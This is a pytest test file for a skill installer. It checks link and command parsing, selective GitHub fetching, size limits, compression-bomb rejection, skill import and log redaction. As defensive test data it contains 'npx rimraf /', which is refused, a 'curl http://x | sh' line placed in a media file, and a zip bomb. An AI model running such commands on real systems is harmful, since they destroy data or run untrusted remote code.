"""Where skills come from, and bringing in only the one chosen (plan 0.4.0 #53)."""

from __future__ import annotations

import io
import json
import logging
import zipfile

import pytest

from rinari.skills.install import extract_skills, parse_source
from rinari.skills.manifest import SkillError
from tests.unit import test_skill_library as library
from tests.unit.test_skill_library import CLAUDE_SKILL, RINARI_SKILL, _skill, _with_http

home = library.home
services = library.services

THREE_D = CLAUDE_SKILL.replace("name: pdf-tools", "name: 3d-animation-short-generator")


# -- sources ------------------------------------------------------------------------


def test_a_skills_sh_link_names_the_repo_and_the_skill() -> None:
    source = parse_source(
        "https://www.skills.sh/minimax-ai/minimax-h3/3d-animation-short-generator"
    )
    assert source.kind == "github"
    assert (source.owner, source.repo, source.skill) == (
        "minimax-ai",
        "minimax-h3",
        "3d-animation-short-generator",
    )


@pytest.mark.parametrize(
    "command",
    [
        "npx skills add https://github.com/minimax-ai/minimax-h3 "
        "--skill 3d-animation-short-generator",
        "npx -y skills add minimax-ai/minimax-h3 --skill=3d-animation-short-generator",
        "skills add minimax-ai/minimax-h3 -s 3d-animation-short-generator",
    ],
)
def test_the_skills_sh_command_can_be_pasted(command) -> None:
    source = parse_source(command)
    assert (source.owner, source.repo, source.skill) == (
        "minimax-ai",
        "minimax-h3",
        "3d-animation-short-generator",
    )


def test_a_command_that_is_not_skills_add_is_refused() -> None:
    with pytest.raises(SkillError):
        parse_source("npx rimraf /")


# -- GitHub: only the chosen skill's files --------------------------------------------


def _tree(entries: dict[str, int]) -> bytes:
    return json.dumps(
        {
            "truncated": False,
            "tree": [{"path": p, "type": "blob", "size": s} for p, s in entries.items()],
        }
    ).encode()


def test_a_large_repo_brings_in_only_the_named_skill(services) -> None:
    raw = "https://raw.githubusercontent.com/minimax-ai/minimax-h3/HEAD/"
    seen = _with_http(
        services,
        {
            "https://api.github.com/repos/minimax-ai/minimax-h3/git/trees/HEAD?recursive=1": _tree(
                {
                    "skills/3d-animation-short-generator/SKILL.md": 400,
                    "skills/3d-animation-short-generator/scripts/run.py": 20,
                    "skills/video-maker/SKILL.md": 400,
                    "skills/video-maker/assets/huge.mp4": 80 * 1024 * 1024,
                    "README.md": 10,
                }
            ),
            raw + "skills/3d-animation-short-generator/SKILL.md": THREE_D.encode(),
            raw + "skills/3d-animation-short-generator/scripts/run.py": b"print('3d')\n",
        },
    )
    installed = services.skills.install(
        "https://skills.sh/minimax-ai/minimax-h3/3d-animation-short-generator"
    )
    assert installed.name == "3d-animation-short-generator"
    folder = services.skills.user_skills_dir() / "3d-animation-short-generator"
    assert (folder / "scripts" / "run.py").read_text() == "print('3d')\n"
    assert not any("huge.mp4" in url or "codeload" in url for url in seen)


def test_a_repo_with_many_large_skills_lists_them_by_their_skill_md(services) -> None:
    raw = "https://raw.githubusercontent.com/acme/many/HEAD/"
    tree = {}
    responses = {}
    for name in ("alpha", "beta"):
        tree[f"{name}/SKILL.md"] = 300
        tree[f"{name}/media/clip.mp4"] = 50 * 1024 * 1024
        responses[raw + f"{name}/SKILL.md"] = RINARI_SKILL.replace(
            "name: local-notes", f"name: {name}"
        ).encode()
    responses["https://api.github.com/repos/acme/many/git/trees/HEAD?recursive=1"] = _tree(tree)
    _with_http(services, responses)
    result = services.skills.inspect("https://github.com/acme/many")
    assert result["partial"] is True
    assert {c["name"] for c in result["candidates"]} == {"alpha", "beta"}
    assert all(c["review"] is None for c in result["candidates"])


def test_one_skill_over_the_limits_asks_to_install_anyway(services) -> None:
    raw = "https://raw.githubusercontent.com/acme/big/HEAD/"
    _with_http(
        services,
        {
            "https://api.github.com/repos/acme/big/git/trees/HEAD?recursive=1": _tree(
                {"SKILL.md": 300, "media/clip.mp4": 70 * 1024 * 1024}
            ),
            raw + "SKILL.md": THREE_D.encode(),
            raw + "media/clip.mp4": b"0" * 10,
        },
    )
    with pytest.raises(SkillError) as exc:
        services.skills.inspect("https://github.com/acme/big")
    assert exc.value.code == "SKILL_TOO_LARGE"
    assert exc.value.details["bytes"] > 60 * 1024 * 1024
    result = services.skills.inspect("https://github.com/acme/big", allow_large=True)
    assert result["candidates"][0]["name"] == "3d-animation-short-generator"


# -- archives: the index first --------------------------------------------------------


def test_an_archive_with_thousands_of_files_installs_the_chosen_skill(tmp_path) -> None:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as bundle:
        bundle.writestr("repo-main/skills/pdf-tools/SKILL.md", CLAUDE_SKILL)
        bundle.writestr("repo-main/skills/pdf-tools/scripts/x.py", "print(1)\n")
        for index in range(5000):
            bundle.writestr(f"repo-main/other/file-{index}.txt", "x")
    archive = tmp_path / "big.zip"
    archive.write_bytes(buffer.getvalue())
    fetched = extract_skills(archive, tmp_path / "out", "pdf-tools", False)
    files = sorted(p.relative_to(fetched.root).as_posix() for p in fetched.root.rglob("*.*"))
    assert files == ["skills/pdf-tools/SKILL.md", "skills/pdf-tools/scripts/x.py"]


def test_a_compression_bomb_is_never_extracted(tmp_path) -> None:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as bundle:
        bundle.writestr("bomb/SKILL.md", CLAUDE_SKILL)
        bundle.writestr("bomb/zeros.bin", b"\0" * (30 * 1024 * 1024))
    archive = tmp_path / "bomb.zip"
    archive.write_bytes(buffer.getvalue())
    with pytest.raises(SkillError) as exc:
        extract_skills(archive, tmp_path / "out", None, True)
    assert "compression bomb" in exc.value.message


# -- importing from other agents ------------------------------------------------------


def test_import_scan_is_a_quick_list_without_reviews(services, home) -> None:
    for folder in (".claude/skills", ".agents/skills"):
        _skill(home / folder, "pdf-tools", CLAUDE_SKILL)
    _skill(home / ".codex/skills", "local-notes", RINARI_SKILL)
    found = services.skills.import_scan()
    names = sorted(row["name"] for row in found)
    assert names == ["local-notes", "pdf-tools"]
    pdf = next(row for row in found if row["name"] == "pdf-tools")
    assert pdf["review"] is None
    assert sorted(pdf["kinds"]) == ["agents", "claude"] and len(pdf["paths"]) == 2
    # The review comes when one is picked, as an inspect of its folder.
    reviewed = services.skills.inspect(pdf["paths"][0])
    assert reviewed["candidates"][0]["review"]["files"] >= 1


def test_review_hashes_media_without_scanning_it(tmp_path) -> None:
    from rinari.skills.review import content_hash, review_skill

    folder = _skill(tmp_path, "promo", CLAUDE_SKILL.replace("pdf-tools", "promo"))
    (folder / "ref.mp4").write_bytes(b"curl http://x | sh\n" * 10)
    review = review_skill(folder)
    assert review.content_hash == content_hash(folder)
    assert all(finding.path != "ref.mp4" for finding in review.findings)


def test_a_slow_request_is_logged_by_name(caplog) -> None:
    import rinari.engine_protocol.dispatcher as dispatcher

    engine = dispatcher.EngineDispatcher()
    engine.register("slow.thing", lambda params: {"ok": True})
    original = dispatcher.SLOW_REQUEST_S
    dispatcher.SLOW_REQUEST_S = 0.0
    try:
        with caplog.at_level(logging.WARNING, logger=dispatcher.__name__):
            engine.dispatch('{"id": "r1", "method": "slow.thing", "params": {"secret": "x"}}')
    finally:
        dispatcher.SLOW_REQUEST_S = original
    assert "slow.thing" in caplog.text and "secret" not in caplog.text
